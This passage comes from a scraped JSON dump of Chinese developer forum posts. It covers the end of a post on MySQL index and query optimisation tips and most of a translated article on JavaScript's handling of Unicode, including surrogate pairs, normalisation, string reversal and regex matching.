维护：索引须要维护（数据变更时）；</p>\n<p>不建议使用索引的情况：</p>\n<p>(1) 数据量很小的表</p>\n<p>(2) 空间紧张</p>\n<h2>常用优化总结</h2>\n<p>优化语句很多，需要注意的也很多，针对平时的情况总结一下几点：</p>\n<h4>1、有索引但未被用到的情况（不建议）</h4>\n<p>(1) Like的参数以通配符开头时</p>\n<p>尽量避免Like的参数以通配符开头，否则数据库引擎会放弃使用索引而进行全表扫描。</p>\n<p>以通配符开头的sql语句，例如：select * from t_credit_detail where Flistid like ‘%0’\\G</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034366890_6283_1493034367516.jpg\" alt=\"img\"></p>\n<p>这是全表扫描，没有使用到索引，不建议使用。</p>\n<p>不以通配符开头的sql语句，例如：select * from t_credit_detail where Flistid like ‘2%’\\G</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034406003_3698_1493034406299.jpg\" alt=\"img\"></p>\n<p>很明显，这使用到了索引，是有范围的查找了，比以通配符开头的sql语句效率提高不少。</p>\n<p>(2) where条件不符合最左前缀原则时</p>\n<p>例子已在最左前缀匹配原则的内容中有举例。</p>\n<p>(3) 使用！= 或 &lt;&gt; 操作符时</p>\n<p>尽量避免使用！= 或 &lt;&gt;操作符，否则数据库引擎会放弃使用索引而进行全表扫描。使用&gt;或&lt;会比较高效。</p>\n<p>select * from t_credit_detail where Flistid != ‘2000000608201108010831508721’\\G</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034437071_602_1493034437269.jpg\" alt=\"img\"></p>\n<p>(4) 索引列参与计算</p>\n<p>应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。</p>\n<p>select * from t_credit_detail where Flistid +1 &gt; ‘2000000608201108010831508722’\\G</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034468431_9410_1493034468638.jpg\" alt=\"img\"></p>\n<p>(5) 对字段进行null值判断</p>\n<p>应尽量避免在where子句中对字段进行null值判断，否则将导致引擎放弃使用索引而进行全表扫描，如： 低效：select * from t_credit_detail where Flistid is null ;</p>\n<p>可以在Flistid上设置默认值0，确保表中Flistid列没有null值，然后这样查询： 高效：select * from t_credit_detail where Flistid =0;</p>\n<p>(6) 使用or来连接条件</p>\n<p>应尽量避免在where子句中使用or来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如： 低效：select * from t_credit_detail where Flistid = ‘2000000608201108010831508721’ or Flistid = ‘10000200001’;</p>\n<p>可以用下面这样的查询代替上面的 or 查询： 高效：select <em>from t_credit_detail where Flistid = ‘2000000608201108010831508721’ union all select</em> from t_credit_detail where Flistid = ‘10000200001’;</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034514735_6209_1493034515011.jpg\" alt=\"img\"></p>\n<h4>2、避免select *</h4>\n<p>在解析的过程中，会将’*’ 依次转换成所有的列名，这个工作是通过查询数据字典完成的，这意味着将耗费更多的时间。</p>\n<p>所以，应该养成一个需要什么就取什么的好习惯。</p>\n<h4>3、order by 语句优化</h4>\n<p>任何在Order by语句的非索引项或者有计算表达式都将降低查询速度。</p>\n<p>方法：1.重写order by语句以使用索引；</p>\n<pre class=\"prettyprint language-javascript\"><code>  2.为所使用的列建立另外一个索引\n\n  3.绝对避免在order by子句中使用表达式。\n</code></pre><h4>4、GROUP BY语句优化</h4>\n<p>提高GROUP BY 语句的效率, 可以通过将不需要的记录在GROUP BY 之前过滤掉</p>\n<p>低效:</p>\n<p>SELECT JOB , AVG(SAL)</p>\n<p>FROM EMP</p>\n<p>GROUP by JOB</p>\n<p>HAVING JOB = ‘PRESIDENT’</p>\n<p>OR JOB = ‘MANAGER’</p>\n<p>高效:</p>\n<p>SELECT JOB , AVG(SAL)</p>\n<p>FROM EMP</p>\n<p>WHERE JOB = ‘PRESIDENT’</p>\n<p>OR JOB = ‘MANAGER’</p>\n<p>GROUP by JOB</p>\n<h4>5、用 exists 代替 in</h4>\n<p>很多时候用 exists 代替 in 是一个好的选择： select num from a where num in(select num from b) 用下面的语句替换： select num from a where exists(select 1 from b where num=a.num)</p>\n<h4>6、使用 varchar/nvarchar 代替 char/nchar</h4>\n<p>尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。</p>\n<h4>7、能用DISTINCT的就不用GROUP BY</h4>\n<p>SELECT OrderID FROM Details WHERE UnitPrice &gt; 10 GROUP BY OrderID</p>\n<p>可改为：</p>\n<p>SELECT DISTINCT OrderID FROM Details WHERE UnitPrice &gt; 10</p>\n<h4>8、能用UNION ALL就不要用UNION</h4>\n<p>UNION ALL不执行SELECT DISTINCT函数，这样就会减少很多不必要的资源。</p>\n<h4>9、在Join表的时候使用相当类型的例，并将其索引</h4>\n<p>如果应用程序有很多JOIN 查询，你应该确认两个表中Join的字段是被建过索引的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。</p>\n<p>而且，这些被用来Join的字段，应该是相同的类型的。例如：如果你要把 DECIMAL 字段和一个 INT 字段Join在一起，MySQL就无法使用它们的索引。对于那些STRING类型，还需要有相同的字符集才行。（两个表的字符集有可能不一样）</p>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<p><strong>获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号及知乎机构号</strong></p>\n</div>","title":"MySQL 索引及查询优化总结","last_reply_at":"2019-01-07T16:28:35.495Z","good":false,"top":false,"reply_count":4,"visit_count":853,"create_at":"2019-01-02T10:10:27.959Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c32b3743898674067a7be27","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017782406\">JavaScript 如何正确处理 Unicode 编码问题！</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>JavaScript 处理 Unicode 的方式至少可以说是令人惊讶的。本文解释了 JavaScript 中的 处理 Unicode 相关的痛点，提供了常见问题的解决方案，并解释了ECMAScript 6 标准如何改进这种情况。</p>\n<h3>Unicode 基础知识</h3>\n<p>在深入研究 JavaScript 之前，先解释一下 Unicode 一些基础知识，这样在 Unicode 方面，我们至少都了解一些。</p>\n<p><strong>Unicode</strong> 是目前绝大多数程序使用的字符编码，定义也很简单，用一个 <strong>码位(code point)</strong> 映射一个字符。码位值的范围是从 <code>U+0000</code> 到 <code>U+10FFFF</code>，可以表示超过 110 万个字符。下面是一些字符与它们的码位。</p>\n<ul>\n<li>A 的码位 U+0041</li>\n<li>a 的码位 U+0061</li>\n<li>© 的码位 U+00A9</li>\n<li>☃ 的码位 U+2603</li>\n<li>💩 的码位 U+1F4A9</li>\n</ul>\n<p><strong>码位</strong> 通常被格式化为十六进制数字，零填充至少四位数，格式为 <code>U +前缀</code>。</p>\n<p>Unicode 最前面的 65536 个字符位，称为 <strong>基本多文种平面（BMP-—Basic Multilingual Plane）</strong>，又简称为“<strong>零号平面</strong>”, plane 0）,它的 码位 范围是从 <code>U+0000</code> 到 <code>U+FFFF</code>。最常见的字符都放在这个平面上，这是 Unicode 最先定义和公布的一个平面。</p>\n<p>剩下的字符都放在 **辅助平面(Supplementary Plane)**或者 <strong>星形平面(astral planes)</strong> ，码位范围从 <code>U+010000</code> 一直到 <code>U+10FFFF</code>，共 16 个辅助平面。</p>\n<p>辅助平面内的码位很容易识别:如果需要超过 4 个十六进制数字来表示码位，那么它就是一个辅助平面内的码。</p>\n<p>现在对 Unicode 有了基本的了解，接下来看看它如何应用于 JavaScript 字符串。</p>\n<h3>转义序列</h3>\n<p>在谷歌控制台输入如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;\\x41\\x42\\x43&#x27;\n    &#x27;ABC&#x27;\n    \n    &gt;&gt; &#x27;\\x61\\x62\\x63&#x27;\n    &#x27;abc&#x27;\n</code></pre><p>以下称为十六进制转义序列。它们由引用匹配码位的两个十六进制数字组成。例如，<code>\\x41</code> 码位为 <code>U+0041</code> 表示大写字母 A。这些转义序列可用于 <code>U+0000</code> 到 <code>U+00FF</code> 范围内的码位。</p>\n<p>同样常见的还有以下类型的转义:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;\\u0041\\u0042\\u0043&#x27;\n    &#x27;ABC&#x27;\n    \n    &gt;&gt; &#x27;I \\u2661 JavaScript!&#x27;\n    &#x27;I ♡ JavaScript!\n</code></pre><p>这些被称为 <strong>Unicode转义序列</strong>。它们由表示码位的 4 个十六进制数字组成。例如，<code>\\u2661</code> 表示码位为 <code>\\U+2661</code> 表示一个心。这些转义序列可以用于 <code>U+0000</code> 到 <code>U+FFFF</code> 范围内的码位，即整个基本平面。</p>\n<p>但是其他的所有辅助平面呢？ 我们需要 4 个以上的十六进制数字来表示它们的码位，那么如何转义它们呢?</p>\n<p>在 ECMAScript 6中，这很简单，因为它引入了一种新的转义序列: <strong>Unicode 码位转义</strong>。例如:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;\\u{41}\\u{42}\\u{43}&#x27;\n    &#x27;ABC&#x27;\n    \n    &gt;&gt; &#x27;\\u{1F4A9}&#x27;\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9 PILE OF POO\n</code></pre><p>在大括号之间可以使用最多 6 个十六进制数字，这足以表示所有 Unicode 码位。因此，通过使用这种类型的转义序列，可以基于其代码位轻松转义任何 Unicode 码位。</p>\n<p>为了向后兼容 ECMAScript 5 和更旧的环境，不幸的解决方案是使用代理对:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;\\uD83D\\uDCA9&#x27;\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9 PILE OF POO\n</code></pre><p>在这种情况下，每个转义表示代理项一半的码位。两个代理项就组成一个辅助码位。</p>\n<p>注意，代理项对码位与原始码位全不同。<a href=\"https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae\">有公式</a>可以根据给定的辅助码位来计算代理项对码位，反之亦然——根据代理对计算原始辅助代码位。</p>\n<p><strong>辅助平面（Supplementary Planes）<strong>中的码位，在 UTF-16 中被编码为一对16 比特长的码元（即32bit,4Bytes），称作</strong>代理对(surrogate pair)</strong>，具体方法是：</p>\n<ul>\n<li>码位减去 <code>0x10000</code>,得到的值的范围为 20 比特长的 <code>0..0xFFFFF</code>.</li>\n<li>高位的 10 比特的值（值的范围为 <code>0..0x3FF</code>）被加上 <code>0xD800</code> 得到第一个码元或称作<strong>高位代理</strong>。</li>\n<li>低位的 10 比特的值（值的范围也是 <code>0..0x3FF</code>）被加上 <code>0xDC00</code> 得到第二个码元或称作<strong>低位代理（low surrogate）</strong>，现在值的范围是 <code>0xDC00..0xDFFF</code>.</li>\n</ul>\n<p>使用代理对，所有辅助平面中的码位(即从 <code>U+010000</code> 到 <code>U+10FFFF</code> )都可以表示，但是使用一个转义来表示基本平面的码位，以及使用两个转义来表示辅助平面中的码位，整个概念是令人困惑的，并且会产生许多恼人的后果。</p>\n<h3>使用 JavaScript 字符串方法来计算字符长度</h3>\n<p>例如，假设你想要计算给定字符串中的字符个数。你会怎么做呢?</p>\n<p>首先想到可能是使用 <code>length</code> 属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;A&#x27;.length &#x2F;&#x2F; 码位： U+0041 表示 A\n    1\n    \n    &gt;&gt; &#x27;A&#x27; == &#x27;\\u0041&#x27;\n    true\n    \n    &gt;&gt; &#x27;B&#x27;.length &#x2F;&#x2F; 码位： U+0042 表示 B\n    1\n    \n    &gt;&gt; &#x27;B&#x27; == &#x27;\\u0042&#x27;\n    true\n</code></pre><p>在这些例子中，字符串的 <code>length</code> 属性恰好反映了字符的个数。这是有道理的：如果我们使用转义序列来表示字符，很明显，我们只需要对每个字符进行一次转义。但情况并非总是如此！这里有一个稍微不同的例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;𝐀&#x27;.length &#x2F;&#x2F; 码位： U+1D400 表示 Math Bold 字体大写 A\n    2\n    \n    &gt;&gt; &#x27;𝐀&#x27; == &#x27;\\uD835\\uDC00&#x27;\n    true\n    \n    &gt;&gt; &#x27;𝐁&#x27;.length &#x2F;&#x2F; 码位： U+1D401 表示 Math Bold 字体大写 B\n    2\n    \n    &gt;&gt; &#x27;𝐁&#x27; == &#x27;\\uD835\\uDC01&#x27;\n    true\n    \n    &gt;&gt; &#x27;💩&#x27;.length &#x2F;&#x2F; U+1F4A9 PILE OF POO\n    2\n    \n    &gt;&gt; &#x27;💩&#x27; == &#x27;\\uD83D\\uDCA9&#x27;\n    true\n</code></pre><p>在内部，JavaScript 将辅助平面内的字符表示为代理对，并将单独的代理对部分开为单独的 “字符”。如果仅使用 ECMAScript 5 兼容转义序列来表示字符，将看到每个辅助平面内的字符都需要两个转义。这是令人困惑的，因为人们通常用 Unicode 字符或图形来代替。</p>\n<h2>计算辅助平面内的字符个数</h2>\n<p>回到这个问题:如何准确地计算 JavaScript 字符串中的字符个数 ? 诀窍就是如何正确地解析代理对，并且只将每对代理对作为一个字符计数。你可以这样使用:</p>\n<pre class=\"prettyprint language-javascript\"><code>    var regexAstralSymbols = &#x2F;[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]&#x2F;g;\n    \n    function countSymbols(string) {\n    \treturn string\n    \t\t&#x2F;&#x2F; Replace every surrogate pair with a BMP symbol.\n    \t\t.replace(regexAstralSymbols, &#x27;_&#x27;)\n    \t\t&#x2F;&#x2F; …and *then* get the length.\n    \t\t.length;\n    }\n</code></pre><p>或者，如果你使用 <a href=\"https://github.com/bestiejs/punycode.js\">Punycode.js</a>，利用它的实用方法在 JavaScript 字符串和 Unicode 码位之间进行转换。<code>decode</code> 方法接受一个字符串并返回一个 Unicode 编码位数组;每个字符对应一项。</p>\n<pre class=\"prettyprint language-javascript\"><code>    function countSymbols(string) {\n    \treturn punycode.ucs2.decode(string).length;\n    }\n</code></pre><p>在 ES6 中，可以使用 <a href=\"https://github.com/mathiasbynens/Array.from\">Array.from</a> 来做类似的事情，它使用字符串的迭代器将其拆分为一个字符串数组，每个字符串数组包含一个字符:</p>\n<pre class=\"prettyprint language-javacript\"><code>    function countSymbols(string) {\n    \treturn Array.from(string).length;\n    }\n</code></pre><p>或者，使用解构运算符 <code>...</code> :</p>\n<pre class=\"prettyprint language-javascript\"><code>    function countSymbols(string) {\n    \treturn [...string].length;\n    }\n</code></pre><p>使用这些实现，我们现在可以正确地计算码位，这将导致更准确的结果:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; countSymbols(&#x27;A&#x27;) &#x2F;&#x2F; 码位：U+0041 表示 A\n    1\n    \n    &gt;&gt; countSymbols(&#x27;𝐀&#x27;) &#x2F;&#x2F; 码位： U+1D400 表示 Math Bold 字体大写 A\n    1\n    \n    &gt;&gt; countSymbols(&#x27;💩&#x27;) &#x2F;&#x2F; U+1F4A9 PILE OF POO\n    1\n</code></pre><h3>找撞脸</h3>\n<p>考虑一下这个例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;mañana&#x27; == &#x27;mañana&#x27;\n    false\n</code></pre><p>JavaScript告诉我们，这些字符串是不同的，但视觉上，没有办法告诉我们！这是怎么回事?</p>\n<p><img src=\"https://image.fundebug.com/2019-01-07-1.png\" alt></p>\n<p><a href=\"https://mothereff.in/js-escapes#1ma%C3%B1ana%20man%CC%83ana\">JavaScript转义工具</a>会告诉你，原因如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;ma\\xF1ana&#x27; == &#x27;man\\u0303ana&#x27;\n    false\n    \n    &gt;&gt; &#x27;ma\\xF1ana&#x27;.length\n    6\n    \n    &gt;&gt; &#x27;man\\u0303ana&#x27;.length\n    7\n</code></pre><p>第一个字符串包含码位 <code>U+00F1</code> 表示字母 n 和 n 头上波浪号，而第二个字符串使用两个单独的码位(<code>U+006E</code>表示字母 n 和 <code>U+0303</code> 表示波浪号)来创建相同的字符。这就解释了为什么它们的长度不同。</p>\n<p>然而，如果我们想用我们习惯的方式来计算这些字符串中的字符个数，我们希望这两个字符串的长度都为 6，因为这是每个字符串中可视可区分的字符的个数。要怎样才能做到这一点呢?</p>\n<p>在ECMAScript 6 中，解决方案相当简单:</p>\n<pre class=\"prettyprint language-javascript\"><code>    function countSymbolsPedantically(string) {\n    \t&#x2F;&#x2F; Unicode Normalization, NFC form, to account for lookalikes:\n    \tvar normalized = string.normalize(&#x27;NFC&#x27;);\n    \t&#x2F;&#x2F; Account for astral symbols &#x2F; surrogates, just like we did before:\n    \treturn punycode.ucs2.decode(normalized).length;\n    }\n</code></pre><p><code>String.prototype</code> 上的 <code>normalize</code> 方法执行 <a href=\"http://unicode.org/reports/tr15/\">Unicode规范</a>化，这解释了这些差异。 如果有一个码位表示与另一个码位后跟组合标记相同的字符，则会将其标准化为单个码位形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; countSymbolsPedantically(&#x27;mañana&#x27;) &#x2F;&#x2F; U+00F1\n    6\n    &gt;&gt; countSymbolsPedantically(&#x27;mañana&#x27;) &#x2F;&#x2F; U+006E + U+0303\n    6\n</code></pre><p>为了向后兼容 ECMAScript5 和旧环境，可以使用 <strong>String.prototype.normalize polyfill</strong>。</p>\n<h3>计算其他组合标记</h3>\n<p>然而，上述方案仍然不是完美的——应用多个组合标记的码位总是导致单个可视字符，但可能没有 normalize 的形式，在这种情况下，normalize 是没有帮助。例如:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;q\\u0307\\u0323&#x27;.normalize(&#x27;NFC&#x27;) &#x2F;&#x2F; &#96;q̣̇&#96;\n    &#x27;q\\u0307\\u0323&#x27;\n    \n    &gt;&gt; countSymbolsPedantically(&#x27;q\\u0307\\u0323&#x27;)\n    3 &#x2F;&#x2F; not 1\n    \n    &gt;&gt; countSymbolsPedantically(&#x27;Z͑ͫ̓ͪ̂ͫ̽͏̴̙̤̞͉͚̯̞̠͍A̴̵̜̰͔ͫ͗͢L̠ͨͧͩ͘G̴̻͈͍͔̹̑͗̎̅͛́Ǫ̵̹̻̝̳͂̌̌͘!͖̬̰̙̗̿̋ͥͥ̂ͣ̐́́͜͞&#x27;)\n    74 &#x2F;&#x2F; not 6\n</code></pre><p>如果需要更精确的解决方案，可以使用正则表达式从输入字符串中删除任何组合标记。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &#x2F;&#x2F;  将下面的正则表达式替换为经过转换的等效表达式，以使其在旧环境中工作\n    \n    var regexSymbolWithCombiningMarks = &#x2F;(\\P{Mark})(\\p{Mark}+)&#x2F;gu;\n    \n    function countSymbolsIgnoringCombiningMarks(string) {\n    \t&#x2F;&#x2F; 删除任何组合字符，只留下它们所属的字符:\n    \tvar stripped = string.replace(regexSymbolWithCombiningMarks, function($0, symbol, combiningMarks) {\n    \t\treturn symbol;\n    \t});\n    \t\n    \treturn punycode.ucs2.decode(stripped).length;\n    }\n</code></pre><p>此函数删除任何组合标记，只留下它们所属的字符。任何不匹配的组合标记(在字符串开头)都保持不变。这个解决方案甚至可以在 ECMAScript3 环境中工作，并且它提供了迄今为止最准确的结果:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; countSymbolsIgnoringCombiningMarks(&#x27;q\\u0307\\u0323&#x27;)\n    1\n    &gt;&gt; countSymbolsIgnoringCombiningMarks(&#x27;Z͑ͫ̓ͪ̂ͫ̽͏̴̙̤̞͉͚̯̞̠͍A̴̵̜̰͔ͫ͗͢L̠ͨͧͩ͘G̴̻͈͍͔̹̑͗̎̅͛́Ǫ̵̹̻̝̳͂̌̌͘!͖̬̰̙̗̿̋ͥͥ̂ͣ̐́́͜͞&#x27;)\n    6\n</code></pre><h2>计算其他类型的图形集群</h2>\n<p>上面的算法仍然是一个简化—它还是无法正确计算像这样的字符：நி，汉语言由连体的 Jamo 组成，如 깍， 表情字符序列，如 👨‍👩‍👧‍👦 （(👨 <code>U+200D</code> + 👩 <code>U+200D</code> + 👧 + <code>U+200D</code> + 👦）或其他类似字符。</p>\n<p>Unicode 文本分段上的 Unicode 标准附件＃29 描述了用于确定字形簇边界的算法。 对于适用于所有 <a href=\"http://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries\">Unicode脚本的完全准确的解决方案</a>，请在 JavaScript 中实现此算法，然后将每个字形集群计为单个字符。 <a href=\"https://github.com/tc39/proposal-intl-segmenter\">有人建议将Intl.Segmenter（一种文本分段API）添加到ECMAScript中</a>。</p>\n<h2>JavaScript 中字符串反转</h2>\n<p>下面是一个类似问题的示例:在JavaScript中反转字符串。这能有多难，对吧? 解决这个问题的一个常见的、非常简单的方法是:</p>\n<pre class=\"prettyprint language-javascript\"><code>    function reverse(string) {\n    \treturn string.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);\n    }\n</code></pre><p>它似乎在很多情况下都很有效:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; reverse(&#x27;abc&#x27;)\n    &#x27;cba&#x27;\n    \n    &gt;&gt; reverse(&#x27;mañana&#x27;) &#x2F;&#x2F; U+00F1\n    &#x27;anañam&#x27;\n</code></pre><p>然而，它完全打乱了包含组合标记或位于辅助平面字符的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; reverse(&#x27;mañana&#x27;) &#x2F;&#x2F; U+006E + U+0303\n    &#x27;anãnam&#x27; &#x2F;&#x2F; note: the &#96;~&#96; is now applied to the &#96;a&#96; instead of the &#96;n&#96;\n    \n    &gt;&gt; reverse(&#x27;💩&#x27;) &#x2F;&#x2F; U+1F4A9\n    &#x27;��&#x27; &#x2F;&#x2F; &#96;&#x27;\\uDCA9\\uD83D&#x27;&#96;, the surrogate pair for &#96;💩&#96; in the wrong order\n</code></pre><p>要在 ES6 中正确反转位于辅助平面字符，字符串迭代器可以与 <code>Array.from</code> 结合使用：</p>\n<pre class=\"prettyprint language-javascript\"><code>    function reverse(string) {\n      return Array.from(string).reverse().join(&#x27;&#x27;);\n    }\n</code></pre><p>但是，这仍然不能解决组合标记的问题。</p>\n<p>幸运的是，一位名叫 Missy Elliot 的聪明的计算机科学家提出了一个<a href=\"https://www.youtube.com/watch?v=UODX_pYpVxk&amp;t=33s\">防弹算法</a>来解释这些问题。它看上去像这样:</p>\n<blockquote>\n<p>我把丁字裤放下，翻转，然后倒过来。我把丁字裤放下，翻转，然后倒过来。</p>\n</blockquote>\n<p>事实上：通过将任何组合标记的位置与它们所属的字符交换，以及在进一步处理字符串之前反转任何代理对，可以成功避免问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &#x2F;&#x2F; 使用库 Esrever (https:&#x2F;&#x2F;mths.be&#x2F;esrever)\n    \n    &gt;&gt; esrever.reverse(&#x27;mañana&#x27;) &#x2F;&#x2F; U+006E + U+0303\n    &#x27;anañam&#x27;\n    \n    &gt;&gt; esrever.reverse(&#x27;💩&#x27;) &#x2F;&#x2F; U+1F4A9\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9\n</code></pre><h3>字符串方法中的 Unicode 的问题</h3>\n<p>这种行为也会影响其他字符串方法。</p>\n<h4><strong>将码位转转换为字符</strong></h4>\n<p><code>String.fromCharCode</code> 可以将一个码位转换为字符。 但它只适用于 <strong>BMP</strong> 范围内的码位 ( 即从 <code>U+0000</code> 到<code>U+FFFF</code>)。如果将它用于转换超过 <strong>BMP</strong> 平面外的码位 ，将获得意想不到的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; String.fromCharCode(0x0041) &#x2F;&#x2F; U+0041\n    &#x27;A&#x27; &#x2F;&#x2F; U+0041\n    \n    &gt;&gt; String.fromCharCode(0x1F4A9) &#x2F;&#x2F; U+1F4A9\n    &#x27;&#x27; &#x2F;&#x2F; U+F4A9, not U+1F4A9\n</code></pre><p>唯一的解决方法是自己计算代理项一半的码位，并将它们作为单独的参数传递。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; String.fromCharCode(0xD83D, 0xDCA9)\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9\n</code></pre><p>如果不想计算代理项的一半，可以使用 <a href=\"https://mths.be/punycode\">Punycode.js</a> 的实用方法:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; punycode.ucs2.encode([ 0x1F4A9 ])\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9\n</code></pre><p>幸运的是，ECMAScript 6 引入了 <code>String.fromCodePoint(codePoint)</code>，它可以位于基本平面外的码位的字符。它可以用于任何 Unicode 编码点，即从 <code>U+000000</code> 到 <code>U+10FFFF</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; String.fromCodePoint(0x1F4A9)\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9\n</code></pre><p>为了向后兼容ECMAScript 5 和更旧的环境，使用  <code>String.fromCodePoint() polyfill</code>。</p>\n<h3>从字符串中获取字符</h3>\n<p>如果使用 <code>String.prototype.charAt(position)</code> 来检索包含字符串中的第一个字符，则只能获得第一个代理项而不是整个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;💩&#x27;.charAt(0) &#x2F;&#x2F; U+1F4A9\n    &#x27;\\uD83D&#x27; &#x2F;&#x2F; U+D83D, i.e. the first surrogate half for U+1F4A9\n</code></pre><p>有人提议在 ECMAScript 7 中引入 <code>String.prototype.at(position)</code>。它类似于<code>charAt</code>，只不过它尽可能地处理完整的字符而不是代理项的一半。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;💩&#x27;.at(0) &#x2F;&#x2F; U+1F4A9\n    &#x27;💩&#x27; &#x2F;&#x2F; U+1F4A9\n</code></pre><p>为了向后兼容 ECMAScript 5 和更旧的环境，可以使用 <a href=\"https://github.com/mathiasbynens/String.prototype.at\">String.prototype.at() polyfill/prollyfill</a>。</p>\n<h3>从字符串中获取码位</h3>\n<p>类似地，如果使用 <code>String.prototype.charCodeAt(position)</code> 检索字符串中第一个字符的码位，将获得第一个代理项的码位，而不是 poo 字符堆的码位。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;💩&#x27;.charCodeAt(0)\n    0xD83D\n</code></pre><p>幸运的是，ECMAScript 6 引入了 <code>String.prototype.codePointAt(position)</code>，它类似于 <code>charCodeAt</code>，只不过它尽可能处理完整的字符而不是代理项的一半。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x27;💩&#x27;.codePointAt(0)\n    0x1F4A9\n</code></pre><p>为了向后兼容 ECMAScript 5 和更旧的环境，使用 <a href=\"https://github.com/mathiasbynens/String.prototype.codePointAt\">String.prototype.codePointAt()_polyfill</a>。</p>\n<h3>遍历字符串中的所有字符</h3>\n<p>假设想要循环字符串中的每个字符，并对每个单独的字符执行一些操作。</p>\n<p>在 ECMAScript 5 中，你必须编写大量的样板代码来判断代理对:</p>\n<pre class=\"prettyprint language-javascript\"><code>    function getSymbols(string) {\n    \tvar index = 0;\n    \tvar length = string.length;\n    \tvar output = [];\n    \tfor (; index &lt; length - 1; ++index) {\n    \t\tvar charCode = string.charCodeAt(index);\n    \t\tif (charCode &gt;= 0xD800 &amp;&amp; charCode &lt;= 0xDBFF) {\n    \t\t\tcharCode = string.charCodeAt(index + 1);\n    \t\t\tif (charCode &gt;= 0xDC00 &amp;&amp; charCode &lt;= 0xDFFF) {\n    \t\t\t\toutput.push(string.slice(index, index + 2));\n    \t\t\t\t++index;\n    \t\t\t\tcontinue;\n    \t\t\t}\n    \t\t}\n    \t\toutput.push(string.charAt(index));\n    \t}\n    \toutput.push(string.charAt(index));\n    \treturn output;\n    }\n    \n    var symbols = getSymbols(&#x27;💩&#x27;);\n    symbols.forEach(function(symbol) {\n    \tconsole.log(symbol == &#x27;💩&#x27;);\n    });\n</code></pre><p>或者可以使用正则表达式，如 <code>var regexCodePoint = /[^\\uD800-\\uDFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDFFF]/g;</code> 并迭代匹配</p>\n<p>在 ECMAScript 6中，你可以简单地使用 <code>for…of</code>。字符串迭代器处理整个字符，而不是代理对。</p>\n<pre class=\"prettyprint language-javascript\"><code>    for (const symbol of &#x27;💩&#x27;) {\n    \tconsole.log(symbol == &#x27;💩&#x27;);\n    }\n</code></pre><p>不幸的是，没有办法对它进行填充，因为 <code>for…of</code> 是一个语法级结构。</p>\n<h4><strong>其他问题</strong></h4>\n<p>此行为会影响几乎所有字符串方法，包括此处未明确提及的方法（如 <code>String.prototype.substring</code>，<code>String.prototype.slice</code> 等），因此在使用它们时要小心。</p>\n<h2>正则表达式中的 Unicode 问题</h2>\n<h4><strong>匹配码位和 Unicode 标量值</strong></h4>\n<p>正则表达式中的点运算符(<code>.</code>)只匹配一个“字符”， 但是由于JavaScript将代理半部分公开为单独的 “字符”，所以它永远不会匹配位于辅助平面上的字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;foo.bar&#x2F;.test(&#x27;foo💩bar&#x27;)\n    false\n</code></pre><p>让我们思考一下，我们可以使用什么正则表达式来匹配任何 Unicode字符? 什么好主意吗? 如下所示的,<code>.</code> 这w个是不够的，因为它不匹配换行符或整个位于辅助平面上的字符。</p>\n<pre class=\"prettyprint 